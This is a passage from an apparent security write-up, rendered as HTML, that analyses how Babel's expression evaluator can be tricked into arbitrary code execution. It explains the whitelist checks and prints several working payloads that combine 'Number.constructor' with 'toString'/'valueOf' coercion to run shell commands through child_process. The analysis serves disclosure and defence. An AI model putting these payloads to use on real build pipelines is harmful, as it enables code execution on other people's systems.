punctuation">[</span><span class="token plain">key</span><span class="token punctuation">]</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> value</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>return</span><span class="token plain"> obj</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token doc-comment comment" style=color:#8e908c>/** snip **/</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">path</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isCallExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> callee </span><span class="token operator">=</span><span class="token plain"> path</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"callee"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>let</span><span class="token plain"> context</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>let</span><span class="token plain"> func</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token comment" style=color:#8e908c>// Number(1);</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      callee</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token operator">!</span><span class="token plain">path</span><span class="token punctuation">.</span><span class="token plain">scope</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>getBinding</span><span class="token punctuation">(</span><span class="token plain">callee</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">(</span><span class="token function" style=color:#4271ae>isValidObjectCallee</span><span class="token punctuation">(</span><span class="token plain">callee</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">||</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token function" style=color:#4271ae>isValidIdentifierCallee</span><span class="token punctuation">(</span><span class="token plain">callee</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      func </span><span class="token operator">=</span><span class="token plain"> global</span><span class="token punctuation">[</span><span class="token plain">callee</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">callee</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isMemberExpression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> object </span><span class="token operator">=</span><span class="token plain"> callee</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"object"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> property </span><span class="token operator">=</span><span class="token plain"> callee</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"property"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token comment" style=color:#8e908c>// Math.min(1, 2)</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        object</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        property</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token function" style=color:#4271ae>isValidObjectCallee</span><span class="token punctuation">(</span><span class="token plain">object</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token operator">!</span><span class="token function" style=color:#4271ae>isInvalidMethod</span><span class="token punctuation">(</span><span class="token plain">property</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">)</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        context </span><span class="token operator">=</span><span class="token plain"> global</span><span class="token punctuation">[</span><span class="token plain">object</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token comment" style=color:#8e908c>// @ts-expect-error property may not exist in context object</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        func </span><span class="token operator">=</span><span class="token plain"> context</span><span class="token punctuation">[</span><span class="token plain">property</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token comment" style=color:#8e908c>// "abc".charCodeAt(4)</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">object</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isLiteral</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"> property</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token comment" style=color:#8e908c>// @ts-expect-error todo(flow->ts): consider checking ast node type instead of value type (StringLiteral and NumberLiteral)</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> type </span><span class="token operator">=</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>typeof</span><span class="token plain"> object</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">value</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">type </span><span class="token operator">===</span><span class="token plain"> </span><span class="token string" style=color:#718c00>"string"</span><span class="token plain"> </span><span class="token operator">||</span><span class="token plain"> type </span><span class="token operator">===</span><span class="token plain"> </span><span class="token string" style=color:#718c00>"number"</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">          </span><span class="token comment" style=color:#8e908c>// @ts-expect-error todo(flow->ts): consider checking ast node type instead of value type</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">          context </span><span class="token operator">=</span><span class="token plain"> object</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">value</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">          func </span><span class="token operator">=</span><span class="token plain"> context</span><span class="token punctuation">[</span><span class="token plain">property</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">func</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> args </span><span class="token operator">=</span><span class="token plain"> path</span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"arguments"</span><span class="token punctuation">)</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">        </span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token plain">arg</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">=></span><span class="token plain"> </span><span class="token function" style=color:#4271ae>evaluateCached</span><span class="token punctuation">(</span><span class="token plain">arg</span><span class="token punctuation">,</span><span class="token plain"> state</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token plain">state</span><span class="token punctuation">.</span><span class="token plain">confident</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>return</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">      </span><span class="token keyword" style=color:#8959a8>return</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>func</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>apply</span><span class="token punctuation">(</span><span class="token plain">context</span><span class="token punctuation">,</span><span class="token plain"> args</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">    </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token doc-comment comment" style=color:#8e908c>/** snip **/</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div></div></div></details>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id=handling-of-call-expressions>Handling of Call Expressions<a href=#handling-of-call-expressions class=hash-link aria-label="Direct link to Handling of Call Expressions" title="Direct link to Handling of Call Expressions">​</a></h4>
<p>The first thing to understand is that while call expressions can indeed be evaluated, they are subject to a whitelist check, relying on the <code>VALID_OBJECT_CALLEES</code> or <code>VALID_IDENTIFIER_CALLEES</code> arrays.</p>
<p>Additionally, there are three cases for handling call expressions:</p>
<ol>
<li>When the callee is an identifier, and the identifier is whitelisted in <code>VALID_OBJECT_CALLEES</code> or <code>VALID_IDENTIFIER_CALLEES</code>.</li>
<li>When the callee is a member expression, the object is an identifier, the identifier is whitelisted in <code>VALID_OBJECT_CALLEES</code>, and the property is not blacklisted in <code>INVALID_METHODS</code>.</li>
<li>When the callee is a member expression, the object is a literal, and the property is a string/numeric literal.</li>
</ol>
<p>The most interesting one is the second case:</p>
<div class="language-typescript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-typescript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  object</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  property</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>isIdentifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token function" style=color:#4271ae>isValidObjectCallee</span><span class="token punctuation">(</span><span class="token plain">object</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">&&</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token operator">!</span><span class="token function" style=color:#4271ae>isInvalidMethod</span><span class="token punctuation">(</span><span class="token plain">property</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">)</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  context </span><span class="token operator">=</span><span class="token plain"> global</span><span class="token punctuation">[</span><span class="token plain">object</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token comment" style=color:#8e908c>// @ts-expect-error property may not exist in context object</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  func </span><span class="token operator">=</span><span class="token plain"> context</span><span class="token punctuation">[</span><span class="token plain">property</span><span class="token punctuation">.</span><span class="token plain">node</span><span class="token punctuation">.</span><span class="token plain">name</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token doc-comment comment" style=color:#8e908c>/** snip **/</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token plain">func</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token punctuation">{</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>const</span><span class="token plain"> args </span><span class="token operator">=</span><span class="token plain"> path</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>get</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"arguments"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token plain">arg</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token operator">=></span><span class="token plain"> </span><span class="token function" style=color:#4271ae>evaluateCached</span><span class="token punctuation">(</span><span class="token plain">arg</span><span class="token punctuation">,</span><span class="token plain"> state</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>if</span><span class="token plain"> </span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token plain">state</span><span class="token punctuation">.</span><span class="token plain">confident</span><span class="token punctuation">)</span><span class="token plain"> </span><span class="token keyword" style=color:#8959a8>return</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain" style=display:inline-block></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain">  </span><span class="token keyword" style=color:#8959a8>return</span><span class="token plain"> </span><span class="token function" style=color:#4271ae>func</span><span class="token punctuation">.</span><span class="token function" style=color:#4271ae>apply</span><span class="token punctuation">(</span><span class="token plain">context</span><span class="token punctuation">,</span><span class="token plain"> args</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token punctuation">}</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<p>The only blacklisted method is <code>random</code>, which is a method of the <code>Math</code> object. This means that any other method of either the whitelisted <code>Number</code>, <code>String</code>, or <code>Math</code> objects can be directly referenced.</p>
<p>In JavaScript, all classes are functions. Since <code>Number</code> and <code>String</code> are global JavaScript classes, their <code>constructor</code> property points to the <code>Function</code> constructor.</p>
<p>Therefore, the two expressions below are equivalent:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token class-name" style=color:#eab700>Number</span><span class="token punctuation">.</span><span class="token method function property-access" style=color:#4271ae>constructor</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>'javascript_code_here;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token plain"></span><br></span><span class=token-line style=color:#4d4d4c><span class="token plain"></span><span class="token known-class-name class-name" style=color:#eab700>Function</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>'javascript_code_here;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<p>Passing in an arbitrary string to the <code>Function</code> constructor returns a function that will evaluate the provided string as JavaScript code when called.</p>
<p>The AST node generated by <code>Number.constructor('javascript_code_here;')</code> contains:</p>
<ul>
<li>A call expression, where<!-- -->
<ul>
<li>The callee is a member expression, where<!-- -->
<ul>
<li>The object is an identifier, with name whitelisted by <code>VALID_OBJECT_CALLEES</code></li>
<li>The property is an identifier, not blacklisted by <code>INVALID_METHODS</code></li>
</ul>
</li>
<li>The arguments are a single string literal, containing the code to be executed.</li>
</ul>
</li>
</ul>
<p>Therefore, the code is considered safe to evaluate, and we have successfuly crafted a malicious function.</p>
<p>However, it is crucial to note that this <em>cannot call the function on its own</em>. It only <strong>creates an anonymous function</strong>.</p>
<p>So, how exactly <em>can</em> we call the function? This is where the second piece of the puzzle comes in: <strong>object expressions</strong>.</p>
<h4 class="anchor anchorWithStickyNavbar_LWe7" id=handling-of-object-expressions>Handling of Object Expressions<a href=#handling-of-object-expressions class=hash-link aria-label="Direct link to Handling of Object Expressions" title="Direct link to Handling of Object Expressions">​</a></h4>
<p>Within Babel’s <code>_evaluate</code> method, an <code>ObjectExpression</code> node undergoes recursive evaluation, producing a true JavaScript object. There’s no limitation on key names for <code>ObjectProperty</code>. As long as every <code>ObjectProperty</code> child in the <code>ObjectExpression</code> yields <code>confident: true</code> from <code>_evaluate()</code>, we can obtain a JavaScript object with custom keys/values.</p>
<p>A key property to leverage is <code>toString</code> (<a href=https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/toString target=_blank rel="noopener noreferrer">MDN Reference</a>). Defining this property on an object to a function we control will allow us to execute arbitrary code when the object is converted to a string.</p>
<p>This is exactly what we do in the payload:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token known-class-name class-name" style=color:#eab700>String</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token plain">  </span><span class="token literal-property property">toString</span><span class="token operator">:</span><span class="token plain"> </span><span class="token class-name" style=color:#eab700>Number</span><span class="token punctuation">.</span><span class="token method function property-access" style=color:#4271ae>constructor</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"console.log(process.mainModule.require('child_process').execSync('id').toString())"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<p>We’ve assigned our malicious function, crafted via the <code>Function</code> constructor, to the <code>toString</code> property of the object. Thus, when this object undergoes a string conversion, it gets triggered and executed.</p>
<p>In the provided example, we pass the object to the <code>String</code> function, given its status as a whitelisted function (referenced in case 1). Still, the <code>String</code> constructor isn’t mandatory. Implicit type coercion in JavaScript can also trigger our malicious function, as demonstratedin these alternative payload formats:</p>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token string" style=color:#718c00>""</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token plain">  </span><span class="token literal-property property">toString</span><span class="token operator">:</span><span class="token plain"> </span><span class="token class-name" style=color:#eab700>Number</span><span class="token punctuation">.</span><span class="token method function property-access" style=color:#4271ae>constructor</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"console.log(process.mainModule.require('child_process').execSync('id').toString())"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path fill=currentColor d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"/></svg><svg viewBox="0 0 24 24" class=copyButtonSuccessIcon_LjdS><path fill=currentColor d=M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z /></svg></span></button></div></div></div>
<div class="language-javascript codeBlockContainer_Ckt0 theme-code-block" style=--prism-color:#4d4d4c;--prism-background-color:#fdfaeb><div class=codeBlockContent_biex><pre tabindex=0 class="prism-code language-javascript codeBlock_bY9V thin-scrollbar" style=color:#4d4d4c;background-color:#fdfaeb><code class=codeBlockLines_e6Vv><span class=token-line style=color:#4d4d4c><span class="token number" style=color:#f5871f>1</span><span class="token operator">+</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token plain">  </span><span class="token literal-property property">valueOf</span><span class="token operator">:</span><span class="token plain"> </span><span class="token class-name" style=color:#eab700>Number</span><span class="token punctuation">.</span><span class="token method function property-access" style=color:#4271ae>constructor</span><span class="token punctuation">(</span><span class="token string" style=color:#718c00>"console.log(process.mainModule.require('child_process').execSync('id').toString())"</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br></span></code></pre><div class=buttonGroup__atx><button type=button aria-label="Copy code to clipboard" title=Copy class=clean-btn><span class=copyButtonIcons_eSgA aria-hidden=true><svg viewBox="0 0 24 24" class=copyButtonIcon_y97N><path 